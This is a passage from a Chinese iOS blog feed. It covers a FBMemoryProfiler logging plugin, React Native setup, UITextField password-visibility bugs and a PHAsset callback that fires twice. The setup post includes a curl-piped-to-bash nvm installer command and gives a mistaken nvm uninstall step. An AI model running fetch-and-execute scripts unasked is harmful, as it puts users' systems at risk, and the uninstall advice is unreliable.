class="meta-string">&lt;Foundation/Foundation.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;FBMemoryProfiler/FBMemoryProfiler.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> Example of FBMemoryProfiler plugin that will NSLog all retain cycles found</div><div class="line"> within FBMemoryProfiler. This could, for instance, send it somewhere to the backend.</div><div class="line"> */</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">RetainCycleLoggerPlugin</span> : <span class="title">NSObject</span> &lt;<span class="title">FBMemoryProfilerPluggable</span>&gt;</span></div><div class="line"></div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></table></figure>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * Copyright (c) 2016-present, Facebook, Inc.</div><div class="line"> * All rights reserved.</div><div class="line"> *</div><div class="line"> * This source code is licensed under the license found in the LICENSE file in</div><div class="line"> * the root directory of this source tree.</div><div class="line"> */</div><div class="line"><span class="meta">#import <span class="meta-string">"RetainCycleLoggerPlugin.h"</span></span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">RetainCycleLoggerPlugin</span></span></div><div class="line"></div><div class="line">- (<span class="keyword">void</span>)memoryProfilerDidFindRetainCycles:(<span class="built_in">NSSet</span> *)retainCycles</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (retainCycles.count) &#123;</div><div class="line">        DDLogWarn(<span class="string">@"%@"</span>, retainCycles);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></table></figure>
<p>其功能就是简单的打印（<code>DDLogWarn是CocoaLumberjack提供的Log方法</code>你可以换成你自己的）</p>
<h2 id="3-修改FBMemoryProfiler的初始化方法"><a href="#3-修改FBMemoryProfiler的初始化方法" class="headerlink" title="3. 修改FBMemoryProfiler的初始化方法"></a>3. 修改FBMemoryProfiler的初始化方法</h2><p>写好插件后需要用起来，去改一下AppDelegate中的FBMemoryProfiler初始化方法即可</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">self</span>.memoryProfiler = [[FBMemoryProfiler alloc] initWithPlugins:@[[CacheCleanerPlugin new],</div><div class="line">                                                                  [RetainCycleLoggerPlugin new]] retainCycleDetectorConfiguration:<span class="literal">nil</span>];</div><div class="line">[<span class="keyword">self</span>.memoryProfiler enable];</div></pre></td></tr></table></figure>
<p>重新运行项目，点击<code>Retain Cycles</code>按钮，是不是能看到控制台有打印了</p>
<p><img src="http://7xt4xp.com2.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E6%8A%A2%E9%B2%9C%E6%9D%A5%E4%BD%93%E9%AA%8C%E4%B8%80%E4%B8%8BFBMemoryProfiler-04.png-w500" alt=""></p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>FBMemoryProfiler目前只是0.1版本，不能算稳定，我在使用的时候也Crash了好几次。但是谁不相信FaceBook的大神呢~嘿嘿</p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#99;&#111;&#100;&#101;&#x72;&#102;&#x69;&#x73;&#104;&#64;&#x31;&#54;&#51;&#x2e;&#x63;&#x6f;&#109;">&#99;&#111;&#100;&#101;&#x72;&#102;&#x69;&#x73;&#104;&#64;&#x31;&#54;&#51;&#x2e;&#x63;&#x6f;&#109;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;FBMemoryProfiler简介&quot;&gt;&lt;a href=&quot;#FBMemoryProfiler简介&quot; class=&quot;headerlink&quot; title=&quot;FBMemoryProfiler简介&quot;&gt;&lt;/a&gt;FBMemoryProfiler简介&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;4月刚刚推出的新品~保证中你口味&lt;/li&gt;
&lt;li&gt;FaceBook荣誉出品~&lt;/li&gt;
&lt;li&gt;作者&lt;a href=&quot;https://github.com/Gricha&quot;&gt;Gricha&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;功能及前身：也许你用过&lt;a href=&quot;https://github.com/facebook/FBRetainCycleDetector&quot;&gt;FBRetainCycleDetector&lt;/a&gt;，这就是&lt;a href=&quot;https://github.com/facebook/FBMemoryProfiler&quot;&gt;FBMemoryProfiler&lt;/a&gt;的前身了，是由Gricha编写用来检测循环引用的小工具。FBMemoryProfiler比FBRetainCycleDetector要强大的多，提供了非常帮的&lt;code&gt;交互界面&lt;/code&gt;和更多的功能。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/facebook/FBMemoryProfiler/master/Example/Images/Example2.gif&quot; alt=&quot;FBMemoryProfiler一览&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>iOS进阶学习——React-Native-环境搭建-run-it</title>
    <link href="http://zhoulingyu.com/2016/04/19/iOS%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94React-Native-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-run-it/"/>
    <id>http://zhoulingyu.com/2016/04/19/iOS进阶学习——React-Native-环境搭建-run-it/</id>
    <published>2016-04-19T03:08:06.000Z</published>
    <updated>2016-08-05T06:22:38.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="官方参考"><a href="#官方参考" class="headerlink" title="官方参考"></a>官方参考</h1><ol>
<li><a href="https://github.com/facebook/react-native" target="_blank" rel="external">react-native github</a></li>
<li><a href="http://reactnative.cn/docs/0.24/getting-started.html#content" target="_blank" rel="external">react-native 中文文档</a></li>
<li><a href="https://nodejs.org/en/" target="_blank" rel="external">node.js</a></li>
<li><a href="https://github.com/creationix/nvm#installation" target="_blank" rel="external">nvm</a></li>
<li><a href="https://facebook.github.io/watchman/docs/install.html" target="_blank" rel="external">watchman</a></li>
<li><a href="http://www.flowtype.org" target="_blank" rel="external">flow</a></li>
</ol>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="Node-js安装"><a href="#Node-js安装" class="headerlink" title="Node.js安装"></a>Node.js安装</h2><ol>
<li>nvm istall<ul>
<li>输入命令<code>curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.31.0/install.sh | bash</code></li>
<li>如果你希望卸载nvm，你可以输入命令<code>$ npm uninstall -g a_module</code></li>
</ul>
</li>
<li>输入命令<code>nvm install node &amp;&amp; nvm</code></li>
<li>使nvm生效：<code>. ~/.nvm/nvm.sh</code> </li>
<li>安装Node.js<code>nvm install node &amp;&amp; nvm alias default node</code></li>
</ol>
<a id="more"></a>
<h2 id="watchman安装"><a href="#watchman安装" class="headerlink" title="watchman安装"></a>watchman安装</h2><ol>
<li><code>brew install watchman</code><h2 id="flow"><a href="#flow" class="headerlink" title="flow"></a>flow</h2><code>brew install flow</code></li>
</ol>
<h2 id="快速使用React-Native"><a href="#快速使用React-Native" class="headerlink" title="快速使用React Native"></a>快速使用React Native</h2><ol>
<li>安装React Native<ul>
<li><code>npm install -g react-native-cli</code> </li>
</ul>
</li>
<li>创建React Native工程<ul>
<li>进入你常用的workspace，输入命令<code>react-native init AwesomeProject</code></li>
<li>稍等会自动帮你创建好工程，大概是这样：<br><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94React-Native-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-run-it-01.png-w375" alt="图片"></li>
</ul>
</li>
<li><p>打开<code>iOS</code>文件夹，发现里面是熟悉的常规工程目录，打开工程，在模拟器上运行（稍后会说明如何在真机运行），效果如下 </p>
<p> <img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94React-Native-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-run-it-02.png-w375" alt="图片"></p>
</li>
<li><p>真机运行</p>
<ul>
<li><p>观察项目<code>AppDelegate.m</code>你可以发现<code>didFinishLaunchingWithOptions</code>中有这样一句</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">jsCodeLocation = [<span class="built_in">NSURL</span> URLWithString:<span class="string">@"http://localhost:8081/index.ios.bundle?platform=ios&amp;dev=true"</span>];</div></pre></td></tr></table></figure>
<p>所以简单的来说，要保证你的真机和mac在同一个网络，将localhost换成mac的IP地址</p>
</li>
</ul>
</li>
</ol>
<h1 id="可能遇到的问题"><a href="#可能遇到的问题" class="headerlink" title="可能遇到的问题"></a>可能遇到的问题</h1><h2 id="react-native命令行慢"><a href="#react-native命令行慢" class="headerlink" title="react-native命令行慢"></a>react-native命令行慢</h2><p>老问题了……替换npm仓库源，换成国内的源</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">npm config set registry https:<span class="comment">//registry.npm.taobao.org</span></div><div class="line">npm config set disturl https:<span class="comment">//npm.taobao.org/dist</span></div></pre></td></tr></table></figure>
<h2 id="watchman无法启动"><a href="#watchman无法启动" class="headerlink" title="watchman无法启动"></a>watchman无法启动</h2><ol>
<li>命令台报错：ERROR  watchman–no-pretty get-sockname returned with exit code null dyld: Library not loaded: /usr/local/lib/libpcre.1.dylib<br>   Referenced from: /usr/local/bin/watchman<br>   Reason: image not found</li>
<li>解决<br> brew uninstall watchman<br> brew install –HEAD watchman</li>
</ol>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#x6d;&#97;&#105;&#108;&#116;&#111;&#58;&#99;&#x6f;&#x64;&#x65;&#x72;&#102;&#105;&#x73;&#x68;&#64;&#49;&#x36;&#x33;&#x2e;&#99;&#111;&#x6d;">&#99;&#x6f;&#x64;&#x65;&#x72;&#102;&#105;&#x73;&#x68;&#64;&#49;&#x36;&#x33;&#x2e;&#99;&#111;&#x6d;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;官方参考&quot;&gt;&lt;a href=&quot;#官方参考&quot; class=&quot;headerlink&quot; title=&quot;官方参考&quot;&gt;&lt;/a&gt;官方参考&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/facebook/react-native&quot;&gt;react-native github&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://reactnative.cn/docs/0.24/getting-started.html#content&quot;&gt;react-native 中文文档&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://nodejs.org/en/&quot;&gt;node.js&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/creationix/nvm#installation&quot;&gt;nvm&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://facebook.github.io/watchman/docs/install.html&quot;&gt;watchman&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.flowtype.org&quot;&gt;flow&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;h2 id=&quot;Node-js安装&quot;&gt;&lt;a href=&quot;#Node-js安装&quot; class=&quot;headerlink&quot; title=&quot;Node.js安装&quot;&gt;&lt;/a&gt;Node.js安装&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;nvm istall&lt;ul&gt;
&lt;li&gt;输入命令&lt;code&gt;curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.31.0/install.sh | bash&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;如果你希望卸载nvm，你可以输入命令&lt;code&gt;$ npm uninstall -g a_module&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;输入命令&lt;code&gt;nvm install node &amp;amp;&amp;amp; nvm&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;使nvm生效：&lt;code&gt;. ~/.nvm/nvm.sh&lt;/code&gt; &lt;/li&gt;
&lt;li&gt;安装Node.js&lt;code&gt;nvm install node &amp;amp;&amp;amp; nvm alias default node&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>iOS——密码明文/密文切换问题</title>
    <link href="http://zhoulingyu.com/2016/03/25/iOS%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E6%98%8E%E6%96%87:%E5%AF%86%E6%96%87%E5%88%87%E6%8D%A2%E9%97%AE%E9%A2%98/"/>
    <id>http://zhoulingyu.com/2016/03/25/iOS——密码明文:密文切换问题/</id>
    <published>2016-03-25T07:35:27.000Z</published>
    <updated>2016-08-05T06:22:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间根据产品经理的要求给我们输入密码的部分加了明文/密文切换，中间也遇到了一些颇有意思的问题。其中也有些很难查到资料。</p>
<p>在这里记录下来，也供大家参考，避免大家重复踩坑。</p>
<h1 id="情景描述"><a href="#情景描述" class="headerlink" title="情景描述"></a>情景描述</h1><p>明文/密文切换，就是输入密码的时候可以选择<code>明文显示</code>还是<code>**</code>这样的显示。</p>
<p><img src="http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E6%98%8E%E6%96%87%3A%E5%AF%86%E6%96%87%E5%88%87%E6%8D%A2%E9%97%AE%E9%A2%98-01.jpg-w375" alt=""></p>
<p><img src="http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E6%98%8E%E6%96%87%3A%E5%AF%86%E6%96%87%E5%88%87%E6%8D%A2%E9%97%AE%E9%A2%98-02.jpg-w375" alt=""></p>
<p>右侧的按钮可以切换明文、密文模式</p>
<a id="more"></a>
<h1 id="UITextField明文-密文切换属性的属性"><a href="#UITextField明文-密文切换属性的属性" class="headerlink" title="UITextField明文\密文切换属性的属性"></a>UITextField明文\密文切换属性的属性</h1><figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">@property</span>(<span class="keyword">nonatomic</span>,<span class="keyword">getter</span>=isSecureTextEntry) <span class="built_in">BOOL</span> secureTextEntry;       <span class="comment">// default is NO</span></div></pre></td></tr></table></figure>
<h1 id="Q1：光标位置错乱"><a href="#Q1：光标位置错乱" class="headerlink" title="Q1：光标位置错乱"></a>Q1：光标位置错乱</h1><p>一般来说密文的时候*号要比字母更宽，当密文切换成明文的时候光标的位置居然没有变化，出现了这样的情况。<br><img src="http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E6%98%8E%E6%96%87%3A%E5%AF%86%E6%96%87%E5%88%87%E6%8D%A2%E9%97%AE%E9%A2%98-03.png-w375" alt="嗯 没有用我们自己的app了，写了个demo，样式很简约"></p>
<p>这个问题在查了一些资料之后发现可能是苹果自己的BUG，当然，对应方法是有的。我们可以在切换代码前将textfiled的enable设为NO，切换后在设置YES。当然，这回让textfiled退出编辑模式。</p>
<p>如果你有更好的方式，欢迎交流，或者在博文后留言😘<br><figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">self</span>.tfPassword.enabled = <span class="literal">NO</span>;</div><div class="line"><span class="keyword">self</span>.tfPassword.secureTextEntry = !<span class="keyword">self</span>.tfPassword.secureTextEntry;</div><div class="line"><span class="keyword">self</span>.tfPassword.enabled = <span class="literal">YES</span>;</div></pre></td></tr></table></figure></p>
<h1 id="Q2：光标位置错乱"><a href="#Q2：光标位置错乱" class="headerlink" title="Q2：光标位置错乱"></a>Q2：光标位置错乱</h1><p>当UITextField经历 <code>明文-&gt;密文-&gt;明文</code> 时，再次输入，无论你输入什么，都会将所有输入清空。</p>
<p>嗯，这确实是个头疼的问题，也没有任何理由，因为UITextField本身如此，而且当时真的想不到任何办法。</p>
<p>最后终于解决。</p>
<p>思路是这样的：我们都只到UITextField的代理UITextFieldDelegate中有方法<code>- (BOOL)textField:(UITextField *)textField shouldChangeCharactersInRange:(NSRange)range replacementString:(NSString *)string;</code> 相信每个人都会常用，通常我们用来抓用户输入的文字，在每次textfield发生字符改变的时候。</p>
<p>但是我们忽略了这个方法的本身作用，注意返回值，这个方法本身是用来返回<code>『是否允许改变textfield字符』</code>。</p>
<p>所以只要在这里做判断：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">- (<span class="built_in">BOOL</span>)textField:(<span class="built_in">UITextField</span> *)textField shouldChangeCharactersInRange:(<span class="built_in">NSRange</span>)range replacementString:(<span class="built_in">NSString</span> *)string &#123;</div><div class="line">    </div><div class="line">    <span class="comment">//string就是此时输入的那个字符</span></div><div class="line">    <span class="comment">//得到输入框的内容</span></div><div class="line">    <span class="built_in">NSString</span> * toBeString = [textField.text stringByReplacingCharactersInRange:range withString:string];</div><div class="line">    <span class="keyword">if</span> (textField == _tfPassword &amp;&amp; textField.isSecureTextEntry ) &#123;</div><div class="line">        textField.text = toBeString;</div><div class="line">        <span class="keyword">return</span> <span class="literal">NO</span>;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="keyword">return</span> <span class="literal">YES</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>完美解决</p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>唔，这篇也给个代码吧，其实只有几行。<br><a href="http://download.csdn.net/detail/u010127917/9472703" target="_blank" rel="external">http://download.csdn.net/detail/u010127917/9472703</a></p>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>其实很多奇怪的问题只有在实际开发的时候发现，这时候你就会认识到自己的经验不足。所以啦，学无止境~。</p>
<p>过段时间妹子我会奉上自己的照片哦~（好久没自拍啦~~😲）</p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#111;&#x3a;&#x63;&#111;&#100;&#x65;&#114;&#x66;&#x69;&#115;&#104;&#64;&#x31;&#x36;&#x33;&#46;&#99;&#111;&#x6d;">&#x63;&#111;&#100;&#x65;&#114;&#x66;&#x69;&#115;&#104;&#64;&#x31;&#x36;&#x33;&#46;&#99;&#111;&#x6d;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前段时间根据产品经理的要求给我们输入密码的部分加了明文/密文切换，中间也遇到了一些颇有意思的问题。其中也有些很难查到资料。&lt;/p&gt;
&lt;p&gt;在这里记录下来，也供大家参考，避免大家重复踩坑。&lt;/p&gt;
&lt;h1 id=&quot;情景描述&quot;&gt;&lt;a href=&quot;#情景描述&quot; class=&quot;headerlink&quot; title=&quot;情景描述&quot;&gt;&lt;/a&gt;情景描述&lt;/h1&gt;&lt;p&gt;明文/密文切换，就是输入密码的时候可以选择&lt;code&gt;明文显示&lt;/code&gt;还是&lt;code&gt;**&lt;/code&gt;这样的显示。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E6%98%8E%E6%96%87%3A%E5%AF%86%E6%96%87%E5%88%87%E6%8D%A2%E9%97%AE%E9%A2%98-01.jpg-w375&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E6%98%8E%E6%96%87%3A%E5%AF%86%E6%96%87%E5%88%87%E6%8D%A2%E9%97%AE%E9%A2%98-02.jpg-w375&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;右侧的按钮可以切换明文、密文模式&lt;/p&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>iOS——iOS8 Photo库 PHAsset之坑</title>
    <link href="http://zhoulingyu.com/2016/03/05/iOS%E2%80%94%E2%80%94iOS8-Photo%E5%BA%93-PHAsset%E4%B9%8B%E5%9D%91/"/>
    <id>http://zhoulingyu.com/2016/03/05/iOS——iOS8-Photo库-PHAsset之坑/</id>
    <published>2016-03-05T06:06:28.000Z</published>
    <updated>2016-08-05T06:23:01.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="问题重现"><a href="#问题重现" class="headerlink" title="问题重现"></a>问题重现</h1><p>最近在做项目的时候，我们选择了一个可以下载iClould图片的三方Picker——CTAssetsPickerController，这个Picker会根据不同系统版本，返回不同类型的图片资源。</p>
<p>iOS8之前，访问系统照片视频使用的是 AssetsLibrary 框架，iOS8之后有了新的系统框架PhotoKit，这一框架对iCloud选图有很好的支持。</p>
<p>AssetsLibrary的图片资源类型是ALAsset，而PhotoKit的图片资源类型是PHAsset。</p>
<p>如果通过PHAsset获取图片资源，可以调用以下方法：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[[PHImageManager defaultManager] requestImageForAsset:asset targetSize:<span class="built_in">CGSizeMake</span>(pixelWidth, pixelHeight) contentMode:PHImageContentModeAspectFit options:<span class="literal">nil</span> resultHandler:^(<span class="built_in">UIImage</span> * _Nullable result, <span class="built_in">NSDictionary</span> * _Nullable info) &#123;</div><div class="line">	<span class="comment">// 回调部分</span></div><div class="line">            </div><div class="line">&#125;];</div></pre></td></tr></table></figure>
<a id="more"></a>
<p>但是这个方法有一个潜在的坑——<code>回调部分会被调两次</code>。</p>
<p>这里是该方法的官方注释：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// If the asset's aspect ratio does not match that of the given targetSize, contentMode determines how the image will be resized.</span></div><div class="line"><span class="comment">//      PHImageContentModeAspectFit: Fit the asked size by maintaining the aspect ratio, the delivered image may not necessarily be the asked targetSize (see PHImageRequestOptionsDeliveryMode and PHImageRequestOptionsResizeMode)</span></div><div class="line"><span class="comment">//      PHImageContentModeAspectFill: Fill the asked size, some portion of the content may be clipped, the delivered image may not necessarily be the asked targetSize (see PHImageRequestOptionsDeliveryMode &amp;&amp; PHImageRequestOptionsResizeMode)</span></div><div class="line"><span class="comment">//      PHImageContentModeDefault: Use PHImageContentModeDefault when size is PHImageManagerMaximumSize (though no scaling/cropping will be done on the result)</span></div><div class="line"><span class="comment">// If -[PHImageRequestOptions isSynchronous] returns NO (or options is nil), resultHandler may be called 1 or more times.</span></div><div class="line"><span class="comment">//     Typically in this case, resultHandler will be called asynchronously on the main thread with the requested results.</span></div><div class="line"><span class="comment">//     However, if deliveryMode = PHImageRequestOptionsDeliveryModeOpportunistic, resultHandler may be called synchronously on the calling thread if any image data is immediately available. If the image data returned in this first pass is of insufficient quality, resultHandler will be called again, asychronously on the main thread at a later time with the "correct" results.</span></div><div class="line"><span class="comment">//     If the request is cancelled, resultHandler may not be called at all.</span></div><div class="line"><span class="comment">// If -[PHImageRequestOptions isSynchronous] returns YES, resultHandler will be called exactly once, synchronously and on the calling thread. Synchronous requests cannot be cancelled. </span></div><div class="line"><span class="comment">// resultHandler for asynchronous requests, always called on main thread</span></div><div class="line"></div><div class="line">- (PHImageRequestID)requestImageForAsset:(PHAsset *)asset targetSize:(<span class="built_in">CGSize</span>)targetSize contentMode:(PHImageContentMode)contentMode options:(<span class="keyword">nullable</span> PHImageRequestOptions *)options resultHandler:(<span class="keyword">void</span> (^)(<span class="built_in">UIImage</span> *__<span class="keyword">nullable</span> result, <span class="built_in">NSDictionary</span> *__<span class="keyword">nullable</span> info))resultHandler;</div></pre></td></tr></table></figure>
<p>大意是：如果asset对应的资源不符合给定的尺寸，将由contentMode决定返回的图片如何压缩。<br>后面说到了回调可能被调用的次数，如果没有仔细看，你根本就搞不明白是怎么一回事。</p>
<p>stackoverflow上有人一语中的(<a href="http://stackoverflow.com/questions/26663258/uiimage-size-returned-from-requestimageforasset-is-not-even-close-to-the-targ" target="_blank" rel="external">原链接</a>)：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">This is because requestImageForAsset will be called twice.</div><div class="line"></div><div class="line">The first time, it will <span class="keyword">return</span> a very same size image, such as (<span class="number">60</span> * <span class="number">45</span>) which I think is the thumbnail of that image.</div><div class="line"></div><div class="line">The second time, you will get the full size image.</div><div class="line"></div><div class="line">I use</div><div class="line"></div><div class="line"><span class="keyword">if</span> ([[info valueForKey:<span class="string">@"PHImageResultIsDegradedKey"</span>]integerValue]==<span class="number">0</span>)&#123;</div><div class="line">    <span class="comment">// Do something with the FULL SIZED image</span></div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="comment">// Do something with the regraded image</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">to distinguish the two different images.</div></pre></td></tr></table></figure>
<p>意思是因为该回调会被调用两次，第一次返回你指定尺寸的图片，第二次将会返回原尺寸图片<br>如果你想区分，可以这样使用：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ([[info valueForKey:<span class="string">@"PHImageResultIsDegradedKey"</span>]integerValue]==<span class="number">0</span>)&#123;</div><div class="line">    <span class="comment">// Do something with the FULL SIZED image</span></div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="comment">// Do something with the regraded image</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="问题为什么是问题"><a href="#问题为什么是问题" class="headerlink" title="问题为什么是问题"></a>问题为什么是问题</h2><p>如果你不去注意这个地方，就可能和我一样去踩坑。<br>为什么这样说？在项目中，我们选中了一批图片，当我需要上传图片到我们的服务器时，需要将PHAsset换成UIImage。<br>当调用<code>- (PHImageRequestID)requestImageForAsset:(PHAsset *)asset targetSize:(CGSize)targetSize contentMode:(PHImageContentMode)contentMode options:(nullable PHImageRequestOptions *)options resultHandler:(void (^)(UIImage *__nullable result, NSDictionary *__nullable info))resultHandler;</code>并在回调中写入上传图片至服务器的代码。这时候，如果回调被调用了两次，就会导致同一张图片被上传两次。如果做了同图判断，就会不断的报出一张图片上传不成功，或者少传一张的情况。</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>关于AssetsLibrary框架的坑，可以看<a href="http://kayosite.com/ios-development-and-detail-of-photo-framework.html/comment-page-1" target="_blank" rel="external">这篇文章</a></p>
<hr>
